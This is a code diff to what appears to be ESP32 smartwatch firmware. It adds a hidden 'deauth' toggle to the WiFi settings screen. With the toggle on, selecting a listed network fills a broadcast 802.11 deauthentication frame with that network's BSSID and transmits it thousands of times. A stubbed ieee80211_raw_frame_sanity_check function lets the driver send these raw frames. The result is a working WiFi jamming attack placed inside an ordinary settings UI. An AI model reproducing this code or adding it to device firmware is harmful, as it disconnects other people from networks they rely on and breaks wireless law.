@@ -40,10 +40,13 @@
 #else
     #include <Arduino.h>
     #include <WiFi.h>
+    #include <esp_wifi.h>
+    #include <esp_err.h>
 #endif
 
 lv_obj_t *wifi_settings_tile=NULL;
 lv_style_t wifi_list_style;
+lv_style_t wifi_list_style_red;
 uint32_t wifi_settings_tile_num;
 icon_t *wifi_setup_icon = NULL;
 
@@ -58,11 +61,13 @@ lv_style_t wifi_setup_style;
 uint32_t wifi_setup_tile_num;
 
 lv_obj_t *wifi_onoff=NULL;
+lv_obj_t *deauth_onoff=NULL;
 lv_obj_t *wifiname_list=NULL;
 
 static void enter_wifi_settings_event_cb( lv_obj_t * obj, lv_event_t event );
 static void enter_wifi_setup_event_cb( lv_obj_t * obj, lv_event_t event );
 static void wifi_onoff_event_handler(lv_obj_t * obj, lv_event_t event);
+static void deauth_onoff_event_handler(lv_obj_t * obj, lv_event_t event);
 void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event );
 bool wifi_setup_wifictl_event_cb( EventBits_t event, void *arg );
 
@@ -72,6 +77,21 @@ static void wifi_setup_bluetooth_message_msg_pharse( BluetoothJsonRequest &doc )
 LV_IMG_DECLARE(lock_16px);
 LV_IMG_DECLARE(unlock_16px);
 LV_IMG_DECLARE(wifi_64px);
+
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
+    if (arg == 31337)
+      return 1;
+    else
+      return 0;
+}
+
+static const uint8_t deauth_frame_default[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+};
 
 void wlan_settings_tile_setup( void ) {
     // get an app tile and copy mainstyle
@@ -94,6 +114,10 @@ void wlan_settings_tile_setup( void ) {
     wifi_onoff = wf_add_switch( wifi_settings_tile, false );
     lv_obj_align( wifi_onoff, setup_btn, LV_ALIGN_OUT_LEFT_MID, -THEME_ICON_PADDING, 0 );
     lv_obj_set_event_cb( wifi_onoff, wifi_onoff_event_handler);
+ 
+    deauth_onoff = wf_add_switch( wifi_settings_tile, false );
+    lv_obj_align( deauth_onoff, wifi_onoff, LV_ALIGN_OUT_LEFT_MID, -THEME_ICON_PADDING, 0 );
+    lv_obj_set_event_cb( deauth_onoff, deauth_onoff_event_handler);
 
     wifiname_list = lv_list_create( wifi_settings_tile, NULL);
     lv_obj_set_size( wifiname_list, lv_disp_get_hor_res( NULL ), lv_disp_get_ver_res( NULL ) - STATUSBAR_HEIGHT - THEME_ICON_SIZE );
@@ -151,9 +175,80 @@ static void wifi_onoff_event_handler(lv_obj_t * obj, lv_event_t event) {
     }
 }
 
+static void deauth_onoff_event_handler(lv_obj_t * obj, lv_event_t event) {
+    switch( event ) {
+        case( LV_EVENT_VALUE_CHANGED ): if( lv_switch_get_state( obj ) ) {
+                                        static lv_style_t wifi_list_style_red;
+                                        lv_style_set_bg_color(&wifi_list_style_red, LV_STATE_DEFAULT, LV_COLOR_RED);
+                                        lv_style_copy(&wifi_list_style, &wifi_list_style_red);
+                                        lv_obj_invalidate( lv_scr_act() );
+                                        }
+                                        else {
+                                        static lv_style_t wifi_list_style_red;
+                                        lv_style_set_bg_color(&wifi_list_style_red, LV_STATE_DEFAULT, LV_COLOR_WHITE);
+                                        lv_style_copy(&wifi_list_style, &wifi_list_style_red);
+                                        lv_obj_invalidate( lv_scr_act() );
+
+                                        }
+    }
+}
+
+
 void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event ) {
     switch( event ) {
-        case( LV_EVENT_CLICKED ):   lv_label_set_text( wifi_password_name_label, lv_list_get_btn_text(obj) );
+        case( LV_EVENT_CLICKED ):   if( lv_switch_get_state( deauth_onoff ) ){
+                                    int b = (lv_list_get_btn_index(NULL, obj));
+
+                                    WiFi.scanNetworks();
+
+                                    String ssid;
+                                    uint8_t encryptionType;
+                                    int32_t RSSI;
+                                    uint8_t *BSSID;
+                                    int32_t channel;
+
+                                    WiFi.getNetworkInfo(b, ssid, encryptionType, RSSI, BSSID, channel);
+                                    log_i("SSID: %s, BSSID: %d, Channel: %d", ssid, BSSID, channel);
+
+                                    WiFi.persistent(false);
+                                    WiFi.mode(WIFI_AP);
+                                    delay (300);
+                                    WiFi.enableAP(true);
+                                    WiFi.softAP("Test", "password1234", channel, 1);
+
+                                    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+                                    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+                                    deauth_frame[10]= BSSID[0];
+                                    deauth_frame[11]= BSSID[1];
+                                    deauth_frame[12]= BSSID[2];
+                                    deauth_frame[13]= BSSID[3];
+                                    deauth_frame[14]= BSSID[4];
+                                    deauth_frame[15]= BSSID[5];
+
+                                    deauth_frame[16]= BSSID[0];
+                                    deauth_frame[17]= BSSID[1];
+                                    deauth_frame[18]= BSSID[2];
+                                    deauth_frame[19]= BSSID[3];
+                                    deauth_frame[20]= BSSID[4];
+                                    deauth_frame[21]= BSSID[5];
+
+                                    for(int y=0; y<1000; y++){
+                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+                                        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
+                                        delay(100);
+                                    }
+                                    WiFi.disconnect(true, true);
+                                    WiFi.mode(WIFI_STA);
+                                    delay(250);
+                                    WiFi.enableAP(false);
+                                    
+                                    wifictl_off();
+                                    motor_vibe(10);
+
+                                    }
+                                    else {
+                                    lv_label_set_text( wifi_password_name_label, lv_list_get_btn_text(obj) );
                                     lv_textarea_set_text( wifi_password_pass_textfield, "");
                                     mainbar_jump_to_tilenumber( wifi_password_tile_num, LV_ANIM_ON );
     }
